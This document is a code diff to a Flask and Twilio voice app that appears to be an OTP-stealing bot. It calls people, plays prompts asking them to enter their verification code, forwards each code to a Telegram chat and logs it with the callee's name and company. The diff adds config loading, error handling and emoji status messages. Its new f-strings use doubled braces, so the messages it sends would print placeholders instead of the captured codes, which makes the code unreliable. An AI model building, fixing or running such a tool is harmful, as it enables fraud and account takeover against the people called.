@@ -4,16 +4,22 @@ import requests
 import datetime
 import pytz
 import os
+import json
 
 app = Flask(__name__)
 
+# Load config from settings.txt
+try:
+    raw_config = json.loads(open('./conf/settings.txt', 'r').read())
+    TELEGRAM_BOT_TOKEN = raw_config['bot_token']
+except Exception as e:
+    print(f"Error loading config: {e}")
+    TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"
 
-TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"
 TELEGRAM_API_BASE = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
 
-
 def send_telegram_message(chat_id, text):
-    """helper func"""
+    """Send message to Telegram"""
     try:
         url = f"{TELEGRAM_API_BASE}/sendMessage"
         payload = {"chat_id": chat_id, "text": text}
@@ -23,13 +29,11 @@ def send_telegram_message(chat_id, text):
         app.logger.error(f"Error sending message to Telegram: {e}")
         return False
 
-
 def get_file_path(user_id, filename):
     """Ensure the directory exists and create a dynamic path"""
     base_path = os.path.join(os.path.dirname(__file__), "conf", user_id)
     os.makedirs(base_path, exist_ok=True)
     return os.path.join(base_path, filename)
-
 
 @app.route("/voice", methods=["POST"])
 def voice():
@@ -40,7 +44,7 @@ def voice():
     resp = VoiceResponse()
 
     if answered_by.startswith("machine_end"):
-        send_telegram_message(chat_id, "Call Status : Voice Mail")
+        send_telegram_message(chat_id, "☎️ Call Status: Voicemail Detected")
         resp.say("We'll call you back, thanks")
         resp.hangup()
         return str(resp)
@@ -50,7 +54,6 @@ def voice():
     gather.play(get_file_path(user_id, "checkifhuman.mp3"))
     resp.append(gather)
     return str(resp)
-
 
 @app.route("/gather", methods=["POST"])
 def gather():
@@ -64,7 +67,12 @@ def gather():
         if choice == "1":
             resp.play(get_file_path(user_id, "explain.mp3"))
             resp.pause(length=2)
-            num_digits = int(open(get_file_path(user_id, "Digits.txt"), "r").read().strip())
+            
+            try:
+                num_digits = int(open(get_file_path(user_id, "Digits.txt"), "r").read().strip())
+            except:
+                num_digits = 6
+            
             gatherotp = Gather(num_digits=num_digits, action=f"/gatherotp?chat_id={chat_id}&user_id={user_id}", timeout=120)
             gatherotp.play(get_file_path(user_id, "askdigits.mp3"))
             resp.append(gatherotp)
@@ -76,7 +84,6 @@ def gather():
 
     return str(resp)
 
-
 @app.route("/gatherotp", methods=["POST"])
 def gatherotp():
     chat_id = request.args.get("chat_id", default="*", type=str)
@@ -85,16 +92,20 @@ def gatherotp():
 
     if "Digits" in request.values:
         otp = request.values["Digits"]
-        send_telegram_message(chat_id, f"OTP : {otp}")
+        send_telegram_message(chat_id, f"✅ OTP Received: `{{otp}}`")
 
-        with open("otp.txt", "w", encoding="utf-8") as otp_file:
-            otp_file.write(otp)
+        # Save OTP to file
+        try:
+            with open("otp.txt", "w", encoding="utf-8") as otp_file:
+                otp_file.write(otp)
 
-        with open("logotp.txt", "a", encoding="utf-8") as log_file:
-            timestamp = datetime.datetime.now(pytz.timezone("Asia/Jakarta"))
-            name = open(get_file_path(user_id, "Name.txt"), "r").read().strip()
-            company = open(get_file_path(user_id, "Company Name.txt"), "r").read().strip()
-            log_file.write(f"Tanggal : {timestamp}\nNama : {name}\nCompany : {company}\nOTP : {otp}\n\n")
+            with open("logotp.txt", "a", encoding="utf-8") as log_file:
+                timestamp = datetime.datetime.now(pytz.timezone("Asia/Jakarta"))
+                name = open(get_file_path(user_id, "Name.txt"), "r").read().strip()
+                company = open(get_file_path(user_id, "Company Name.txt"), "r").read().strip()
+                log_file.write(f"Tanggal : {{timestamp}}\nNama : {{name}}\nCompany : {{company}}\nOTP : {{otp}}\n\n")
+        except Exception as e:
+            app.logger.error(f"Error saving OTP: {e}")
 
         resp.play(get_file_path("sounds", "thankyou.mp3"))
     else:
@@ -103,25 +114,27 @@ def gatherotp():
 
     return str(resp)
 
-
 @app.route("/denyotp", methods=["POST"])
 def denyotp():
     chat_id = request.args.get("chat_id", default="*", type=str)
     user_id = request.args.get("user_id", default="*", type=str)
 
-    send_telegram_message(chat_id, "Resend Code")
+    send_telegram_message(chat_id, "🔄 OTP Rejected - Requesting New Code")
 
     resp = VoiceResponse()
     resp.play(get_file_path("sounds", "wrongcode.mp3"))
     resp.pause(length=1)
 
-    num_digits = int(open(get_file_path(user_id, "Digits.txt"), "r").read().strip())
+    try:
+        num_digits = int(open(get_file_path(user_id, "Digits.txt"), "r").read().strip())
+    except:
+        num_digits = 6
+    
     gatherotp = Gather(num_digits=num_digits, action=f"/gathernewotp?chat_id={chat_id}&user_id={user_id}", timeout=120)
-    gatherotp.say(f"Please enter the {num_digits} digits code.", voice="man")
+    gatherotp.say(f"Please enter the {{num_digits}} digits code.", voice="man")
     resp.append(gatherotp)
 
     return str(resp)
-
 
 @app.route("/gathernewotp", methods=["POST"])
 def gathernewotp():
@@ -131,7 +144,7 @@ def gathernewotp():
 
     if "Digits" in request.values:
         otp = request.values["Digits"]
-        send_telegram_message(chat_id, f"OTP : {otp}")
+        send_telegram_message(chat_id, f"✅ New OTP: `{{otp}}`")
         resp.play(get_file_path("sounds", "thankyou.mp3"))
     else:
         resp.say("Sorry, I don't understand that choice.")
@@ -139,13 +152,11 @@ def gathernewotp():
 
     return str(resp)
 
-
 @app.route("/acceptotp", methods=["POST"])
 def acceptotp():
     resp = VoiceResponse()
     resp.play(get_file_path("sounds", "thankyou.mp3"))
     return str(resp)
 
-
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run(host="0.0.0.0", port=5000, debug=False)
